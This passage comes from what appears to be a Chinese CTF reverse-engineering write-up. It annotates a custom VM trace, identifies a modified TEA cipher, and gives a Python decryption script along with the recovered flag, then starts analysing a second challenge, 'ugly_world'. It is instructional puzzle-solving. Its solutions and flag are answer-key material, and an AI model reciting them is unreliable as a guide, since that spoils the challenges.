<span class="keyword">mov</span> reg[<span class="number">3</span>] = <span class="number">0x200</span>, memory[<span class="number">53</span>] = <span class="number">0x200</span></span><br><span class="line">op <span class="number">349</span>: <span class="number">0x2</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0x4</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">0</span>] = <span class="number">0x34333231</span>, memory[<span class="number">129</span>] = <span class="number">0x38373635</span></span><br><span class="line">op <span class="number">356</span>: <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xffffffe8</span>, <span class="number">0x0</span>, 作用: <span class="keyword">mov</span> memory[<span class="number">55</span>] = <span class="number">0x0</span>, reg[<span class="number">0</span>] = <span class="number">0x38373635</span></span><br><span class="line">op <span class="number">361</span>: <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xfffffff0</span>, <span class="number">0x0</span>, 作用: <span class="keyword">mov</span> memory[<span class="number">57</span>] = <span class="number">0x0</span>, <span class="number">0x0</span></span><br><span class="line">op <span class="number">366</span>: <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0xffffffdc</span>, <span class="number">0x0</span>, 作用: <span class="keyword">mov</span> (<span class="number">0</span>#<span class="built_in">BYTE</span>)memory[<span class="number">52</span>] = <span class="number">0x0</span>, reg[<span class="number">0</span>] = <span class="number">0x0</span></span><br><span class="line">op <span class="number">371</span>: <span class="number">0xc</span>, <span class="number">0x183</span>, 作用: <span class="keyword">jmp</span> <span class="number">0x183</span>									//外轮循环的强制跳转：确保<span class="number">4</span>组<span class="built_in">dword</span>全被加密</span><br><span class="line">op <span class="number">387</span>: <span class="number">0x9</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0xffffffdc</span>, <span class="number">0x30</span>, 作用: <span class="keyword">cmp</span> (#0<span class="built_in">BYTE</span>)memory[<span class="number">52</span>] = <span class="number">0x0</span>, <span class="number">0x30</span></span><br><span class="line">op <span class="number">392</span>: <span class="number">0x14</span>, <span class="number">0x223</span>, 作用: <span class="keyword">jz</span>(xmm[<span class="number">2</span>]) <span class="number">0x223</span> 此处未跳转							//用于跳出外轮循环的指令</span><br><span class="line">op <span class="number">394</span>: <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0xffffffe8</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">3</span>] = <span class="number">0x200</span>, memory[<span class="number">55</span>] = <span class="number">0x38373635</span></span><br><span class="line">op <span class="number">399</span>: <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0x6</span>, 作用: <span class="keyword">shr</span> reg[<span class="number">3</span>] = <span class="number">0x38373635</span>, <span class="number">0x6</span></span><br><span class="line">op <span class="number">403</span>: <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xffffffe8</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">0</span>] = <span class="number">0x38373635</span>, memory[<span class="number">55</span>] = <span class="number">0x38373635</span></span><br><span class="line">op <span class="number">408</span>: <span class="number">0x8</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, 作用: <span class="keyword">shl</span> reg[<span class="number">0</span>] = <span class="number">0x38373635</span>, <span class="number">0x5</span></span><br><span class="line">op <span class="number">412</span>: <span class="number">0x5</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, 作用: <span class="keyword">xor</span> reg[<span class="number">3</span>] = <span class="number">0xe0dcd8</span>, reg[<span class="number">0</span>] = <span class="number">0x6e6c6a0</span>				//明显的连锁异或</span><br><span class="line">op <span class="number">416</span>: <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0xffffffe8</span>, 作用: <span class="keyword">add</span> reg[<span class="number">3</span>] = <span class="number">0x6061a78</span>, memory[<span class="number">55</span>] = <span class="number">0x38373635</span></span><br><span class="line">op <span class="number">421</span>: <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0xfffffff0</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">2</span>] = <span class="number">0x0</span>, memory[<span class="number">57</span>] = <span class="number">0x0</span></span><br><span class="line">op <span class="number">426</span>: <span class="number">0xd</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, 作用: <span class="keyword">and</span> reg[<span class="number">2</span>] = <span class="number">0x0</span>, <span class="number">0x3</span>							//标志性的&amp;<span class="number">3</span></span><br><span class="line">op <span class="number">430</span>: <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xfffffff4</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">0</span>] = <span class="number">0x6e6c6a0</span>, memory[<span class="number">58</span>] = <span class="number">0xa4</span></span><br><span class="line">op <span class="number">435</span>: <span class="number">0x2</span>, <span class="number">0x9</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">2</span>] = <span class="number">0x0</span>, memory[<span class="number">41</span>] = <span class="number">0x766f6843</span></span><br><span class="line">op <span class="number">441</span>: <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0xfffffff0</span>, 作用: <span class="keyword">add</span> reg[<span class="number">2</span>] = <span class="number">0x766f6843</span>, memory[<span class="number">57</span>] = <span class="number">0x0</span></span><br><span class="line">op <span class="number">446</span>: <span class="number">0x5</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, 作用: <span class="keyword">xor</span> reg[<span class="number">3</span>] = <span class="number">0x3e3d50ad</span>, reg[<span class="number">2</span>] = <span class="number">0x766f6843</span></span><br><span class="line">op <span class="number">450</span>: <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0xffffffec</span>, 作用: <span class="keyword">add</span> reg[<span class="number">3</span>] = <span class="number">0x485238ee</span>, memory[<span class="number">56</span>] = <span class="number">0x34333231</span></span><br><span class="line">op <span class="number">455</span>: <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xffffffec</span>, <span class="number">0x3</span>, 作用: <span class="keyword">mov</span> memory[<span class="number">56</span>] = <span class="number">0x34333231</span>, reg[<span class="number">3</span>] = <span class="number">0x7c856b1f</span></span><br><span class="line">op <span class="number">460</span>: <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0xfffffff0</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">3</span>] = <span class="number">0x7c856b1f</span>, memory[<span class="number">57</span>] = <span class="number">0x0</span></span><br><span class="line">op <span class="number">465</span>: <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0xffffffd0</span>, 作用: <span class="keyword">sub</span> reg[<span class="number">3</span>] = <span class="number">0x0</span>, memory[<span class="number">49</span>] = <span class="number">0x1919810a</span>			//魔改的delta=-<span class="number">0x1919810A</span></span><br><span class="line">op <span class="number">470</span>: <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xfffffff0</span>, <span class="number">0x3</span>, 作用: <span class="keyword">mov</span> memory[<span class="number">57</span>] = <span class="number">0x0</span>, reg[<span class="number">3</span>] = <span class="number">0xe6e67ef6</span></span><br><span class="line">op <span class="number">475</span>: <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xffffffec</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">0</span>] = <span class="number">0xa4</span>, memory[<span class="number">56</span>] = <span class="number">0x7c856b1f</span></span><br><span class="line">op <span class="number">480</span>: <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x7</span>, 作用: <span class="keyword">shr</span> reg[<span class="number">0</span>] = <span class="number">0x7c856b1f</span>, <span class="number">0x7</span></span><br><span class="line">op <span class="number">484</span>: <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0xffffffec</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">2</span>] = <span class="number">0x766f6843</span>, memory[<span class="number">56</span>] = <span class="number">0x7c856b1f</span></span><br><span class="line">op <span class="number">489</span>: <span class="number">0x8</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, 作用: <span class="keyword">shl</span> reg[<span class="number">2</span>] = <span class="number">0x7c856b1f</span>, <span class="number">0x3</span></span><br><span class="line">op <span class="number">493</span>: <span class="number">0x5</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, 作用: <span class="keyword">xor</span> reg[<span class="number">0</span>] = <span class="number">0xf90ad6</span>, reg[<span class="number">2</span>] = <span class="number">0xe42b58f8</span>				//明显的上下半轮</span><br><span class="line">op <span class="number">497</span>: <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xffffffec</span>, 作用: <span class="keyword">add</span> reg[<span class="number">0</span>] = <span class="number">0xe4d2522e</span>, memory[<span class="number">56</span>] = <span class="number">0x7c856b1f</span></span><br><span class="line">op <span class="number">502</span>: <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0xfffffff0</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">3</span>] = <span class="number">0xe6e67ef6</span>, memory[<span class="number">57</span>] = <span class="number">0xe6e67ef6</span></span><br><span class="line">op <span class="number">507</span>: <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0xb</span>, 作用: <span class="keyword">shr</span> reg[<span class="number">3</span>] = <span class="number">0xe6e67ef6</span>, <span class="number">0xb</span></span><br><span class="line">op <span class="number">511</span>: <span class="number">0xd</span>, <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, 作用: <span class="keyword">and</span> reg[<span class="number">3</span>] = <span class="number">0x1cdccf</span>, <span class="number">0x3</span></span><br><span class="line">op <span class="number">515</span>: <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0xfffffff4</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">2</span>] = <span class="number">0xe42b58f8</span>, memory[<span class="number">58</span>] = <span class="number">0xa4</span></span><br><span class="line">op <span class="number">520</span>: <span class="number">0x2</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">3</span>] = <span class="number">0x3</span>, memory[<span class="number">44</span>] = <span class="number">0x5f363377</span></span><br><span class="line">op <span class="number">526</span>: <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0xfffffff0</span>, 作用: <span class="keyword">add</span> reg[<span class="number">3</span>] = <span class="number">0x5f363377</span>, memory[<span class="number">57</span>] = <span class="number">0xe6e67ef6</span></span><br><span class="line">op <span class="number">531</span>: <span class="number">0x5</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, 作用: <span class="keyword">xor</span> reg[<span class="number">0</span>] = <span class="number">0x6157bd4d</span>, reg[<span class="number">3</span>] = <span class="number">0x461cb26d</span></span><br><span class="line">op <span class="number">535</span>: <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xffffffe8</span>, 作用: <span class="keyword">add</span> reg[<span class="number">0</span>] = <span class="number">0x274b0f20</span>, memory[<span class="number">55</span>] = <span class="number">0x38373635</span></span><br><span class="line">op <span class="number">540</span>: <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xffffffe8</span>, <span class="number">0x0</span>, 作用: <span class="keyword">mov</span> memory[<span class="number">55</span>] = <span class="number">0x38373635</span>, reg[<span class="number">0</span>] = <span class="number">0x5f824555</span></span><br><span class="line">op <span class="number">545</span>: <span class="number">0xc</span>, <span class="number">0x175</span>, 作用: <span class="keyword">jmp</span> <span class="number">0x175</span>									//内轮循环的强制跳转：确保加密循环够<span class="number">0x30</span>轮</span><br><span class="line">op <span class="number">373</span>: <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0xffffffdc</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">2</span>] = <span class="number">0xa4</span>, memory[<span class="number">52</span>] = <span class="number">0x0</span></span><br><span class="line">op <span class="number">378</span>: <span class="number">0x4</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, 作用: <span class="keyword">add</span> reg[<span class="number">2</span>] = <span class="number">0x0</span>, <span class="number">0x1</span></span><br><span class="line">op <span class="number">382</span>: <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xffffffdc</span>, <span class="number">0x2</span>, 作用: <span class="keyword">mov</span> memory[<span class="number">52</span>] = <span class="number">0x0</span>, reg[<span class="number">2</span>] = <span class="number">0x1</span></span><br><span class="line">op <span class="number">387</span>: <span class="number">0x9</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0xffffffdc</span>, <span class="number">0x30</span>, 作用: <span class="keyword">cmp</span> (#0<span class="built_in">BYTE</span>)memory[<span class="number">52</span>] = <span class="number">0x1</span>, <span class="number">0x30</span></span><br><span class="line">op <span class="number">392</span>: <span class="number">0x14</span>, <span class="number">0x223</span>, 作用: <span class="keyword">jz</span>(xmm[<span class="number">2</span>]) <span class="number">0x223</span> 此处未跳转							//用于跳出内轮循环的指令</span><br><span class="line">op <span class="number">394</span>: <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0xffffffe8</span>, 作用: <span class="keyword">mov</span> reg[<span class="number">3</span>] = <span class="number">0x461cb26d</span>, memory[<span class="number">55</span>] = <span class="number">0x5f824555</span></span><br><span class="line">op <span class="number">399</span>: <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0x6</span>, 作用: <span class="keyword">shr</span> reg[<span class="number">3</span>] = <span class="number">0x5f824555</span>, <span class="number">0x6</span></span><br><span class="line">...</span><br><span class="line">op <span class="number">540</span>: <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xffffffe8</span>, <span class="number">0x0</span>, 作用: <span class="keyword">mov</span> memory[<span class="number">55</span>] = <span class="number">0x5f824555</span>, reg[<span class="number">0</span>] = <span class="number">0x6034e99d</span></span><br><span class="line">op <span class="number">545</span>: <span class="number">0xc</span>, <span class="number">0x175</span>, 作用: <span class="keyword">jmp</span> <span class="number">0x175</span>									//两个强制跳转之间的部分就是一个循环，也是加密的一个周期</span><br></pre></td></tr></table></figure>
<p>编写同构加密脚本并进行解密：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_to_dwords_little_endian</span>(<span class="params">byte_array</span>):</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>.from_bytes(byte_array[i:i+<span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(byte_array), <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dwords_to_bytes_little_endian</span>(<span class="params">dword_array</span>):</span><br><span class="line">    byte_list = []</span><br><span class="line">    <span class="keyword">for</span> dword <span class="keyword">in</span> dword_array:</span><br><span class="line">        byte_list.extend(dword.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> byte_list</span><br><span class="line"></span><br><span class="line">m1 = <span class="number">0x34333231</span></span><br><span class="line">m2 = <span class="number">0x38373635</span></span><br><span class="line">delta = <span class="number">0x1919810A</span></span><br><span class="line">key = [<span class="number">0x766F6843</span>, <span class="number">0x6E695F79</span>, <span class="number">0x5F79656B</span>, <span class="number">0x5F363377</span>]</span><br><span class="line">ttl = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x30</span>):</span><br><span class="line">    m1 = (m1 + ((((m2 &gt;&gt; <span class="number">6</span>) ^ (m2 &lt;&lt; <span class="number">5</span>)) + m2) ^ (ttl + key[ttl &amp; <span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    ttl = (ttl - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    m2 = (m2 + ((((m1 &gt;&gt; <span class="number">7</span>) ^ (m1 &lt;&lt; <span class="number">3</span>)) + m1) ^ (ttl + key[(ttl &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"><span class="comment"># print(hex(m1), hex(m2))</span></span><br><span class="line"></span><br><span class="line">encflag = [<span class="number">0xE5</span>, <span class="number">0xDF</span>, <span class="number">0xF0</span>, <span class="number">0xA1</span>, <span class="number">0xF4</span>, <span class="number">0xBD</span>, <span class="number">0x6A</span>, <span class="number">0xDB</span>, </span><br><span class="line">           <span class="number">0x1B</span>, <span class="number">0xE9</span>, <span class="number">0xDD</span>, <span class="number">0x20</span>, <span class="number">0x0D</span>, <span class="number">0x9D</span>, <span class="number">0x21</span>, <span class="number">0x59</span>, </span><br><span class="line">           <span class="number">0xD0</span>, <span class="number">0xB3</span>, <span class="number">0x59</span>, <span class="number">0x29</span>, <span class="number">0xB9</span>, <span class="number">0xEC</span>, <span class="number">0x2F</span>, <span class="number">0xC0</span>, </span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0x7E</span>, <span class="number">0xAD</span>, <span class="number">0xE1</span>, <span class="number">0xB0</span>, <span class="number">0x15</span>, <span class="number">0xB6</span>, <span class="number">0x29</span>]</span><br><span class="line">dwordenc = bytes_to_dwords_little_endian(encflag)</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(dwordenc)//<span class="number">2</span>):</span><br><span class="line">    m1 = dwordenc[<span class="number">2</span>*j]</span><br><span class="line">    m2 = dwordenc[<span class="number">2</span>*j+<span class="number">1</span>]</span><br><span class="line">    ttl = (<span class="number">0</span> - <span class="number">0x30</span> * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x30</span>):</span><br><span class="line">        m2 = (m2 - ((((m1 &gt;&gt; <span class="number">7</span>) ^ (m1 &lt;&lt; <span class="number">3</span>)) + m1) ^ (ttl + key[(ttl &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        ttl = (ttl + delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        m1 = (m1 - ((((m2 &gt;&gt; <span class="number">6</span>) ^ (m2 &lt;&lt; <span class="number">5</span>)) + m2) ^ (ttl + key[ttl &amp; <span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    result.append(m1)</span><br><span class="line">    result.append(m2)</span><br><span class="line">flag = dwords_to_bytes_little_endian(result)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(flag[i]),end=<span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
<p>得到flag：<font color=deepskyblue><strong>flag{D0_yOu_l1k3_VmmmmMMMMMmmm?}</strong></font>.</p>
<h2 id="ugly-world："><a href="#ugly-world：" class="headerlink" title="ugly_world："></a>ugly_world：</h2><p>又是一个体力活，发现程序本身很简单：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">104</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%40s&quot;</span>, v4);</span><br><span class="line">  encrypt((__int64)v4, (__int64)&amp;key); <span class="comment">//key是四个dword：[0x11223344, 0x55667788, 0x9900AABB, 0xCCDDEEFF]</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)compare((__int64)v4, (__int64)&amp;cipher) )</span><br><span class="line">    Right();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    Wrong();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line">__int64 __fastcall <span class="title function_">encrypt</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i += <span class="number">2</span> )</span><br><span class="line">    result = long_enc((<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">4LL</span> * i), a2); <span class="comment">//一次带入8字节，共计带入5次</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flag有40位（密文：<font color=lime><strong>[0x58, 0xbe, 0xd3, 0x0b, 0xfb, 0xbb, 0x73, 0xbe, 0x4e, 0xaf, 0xc8, 0xc8, 0x86, 0x7d, 0x3c, 0x0b, 0x09, 0x7c, 0x25, 0xc0, 0xb0, 0xe0, 0x8f, 0x1d, 0x0c, 0x18, 0x37, 0x88, 0x23, 0x9d, 0xcf, 0xf5, 0x99, 0xb5, 0xa8, 0xb7, 0x3d, 0x0f, 0x63, 0xae]</strong></font>），一次带入8个字节进行加密，但是加密函数居然有将近5000行，不过程序本身函数总数很少，分析加密过程中用到的所有函数，发现一共有8种，其中又有三种是主要的五种加密的子函数，经过分析发现这些函数虽然看起来很复杂但实际上的效果很简单，分别对应整数加和、从密钥中提取一个dword、算术右移、左移和三元异或，并且整个加密过程一直在循环，共计有128轮循环，列举一个循环：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">v2051 = *a1; <span class="comment">//初始化</span></span><br><span class="line">  v2180 = a1[<span class="number">1</span>];</span><br><span class="line"><span class="comment">//开始循环</span></span><br><span class="line">  v2308 = add(<span class="number">0</span>, <span class="number">0x3CA6F3Eu</span>);</span><br><span class="line">  v2 = extract(a2, <span class="number">1</span>);</span><br><span class="line">  v3 = sar (v2180, <span class="number">1</span>);</span><br><span class="line">  v4 = add(v3, v2);</span><br><span class="line">  v5 = add(v2180, v2308);</span><br><span class="line">  v6 = extract(a2, <span class="number">0</span>);</span><br><span class="line">  v7 = shl(v2180, <span class="number">1</span>);</span><br><span class="line">  v8 = add(v7, v6);</span><br><span class="line">  v9 = xor(v8, v5, v4);</span><br><span class="line">  v2052 = add(v2051, v9);</span><br><span class="line">  v10 = extract(a2, <span class="number">3</span>);</span><br><span class="line">  v11 = shr(v2052, <span class="number">1</span>);</span><br><span class="line">  v12 = add(v11, v10);</span><br><span class="line">  v13 = add(v2052, v2308);</span><br><span class="line">  v14 = extract(a2, <span class="number">2</span>);</span><br><span class="line">  v15 = sar (v2052, <span class="number">1</span>);</span><br><span class="line">  v16 = add(v15, v14);</span><br><span class="line">  v17 = xor(v16, v13, v12);</span><br><span class="line">  v2181 = add(v2180, v17);</span><br><span class="line"><span class="comment">//下一个循环</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">//最后一个循环</span></span><br><span class="line">v2435 = add(v2434, <span class="number">0x47C8D0F7u</span>);</span><br><span class="line">  v2034 = extract(a2, <span class="number">1</span>);</span><br><span class="line">  v2035 = sar(v2307, <span class="number">2</span>);</span><br><span class="line">  v2036 = add(v2035, v2034);</span><br><span class="line">  v2037 = add(v2307, v2435);</span><br><span class="line">  v2038 = extract(a2, <span class="number">0</span>);</span><br><span class="line">  v2039 = shl (v2307, <span class="number">3</span>);</span><br><span class="line">  v2040 = add(v2039, v2038);</span><br><span class="line">  v2041 = xor(v2040, v2037, v2036);</span><br><span class="line">  v2179 = add(v2178, v2041);</span><br><span class="line">  v2042 = extract(a2, <span class="number">3</span>);</span><br><span class="line">  v2043 = sar (v2179, <span class="number">2</span>);</span><br><span class="line">  v2044 = add(v2043, v2042);</span><br><span class="line">  v2045 = add(v2179, v2435);</span><br><span class="line">  v2046 = extract(a2, <span class="number">2</span>);</span><br><span class="line">  v2047 = shl (v2179, <span class="number">3</span>);</span><br><span class="line">  v2048 = add(v2047, v2046);</span><br><span class="line">  v2049 = xor(v2048, v2045, v2044);</span><br><span class="line">  LODWORD(result) = add(v2307, v2049);	<span class="comment">//返回结果</span></span><br><span class="line">  *a1 = v2179;</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)result;</span><br><span class="line">  a1[<span class="number">1</span>] = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
<p>提取题目中一个循环的加密过程，仔细研究后发现是魔改的TEA加密，共有128轮，每轮的delta和位移均不同，用python脚本提取数据：</p>
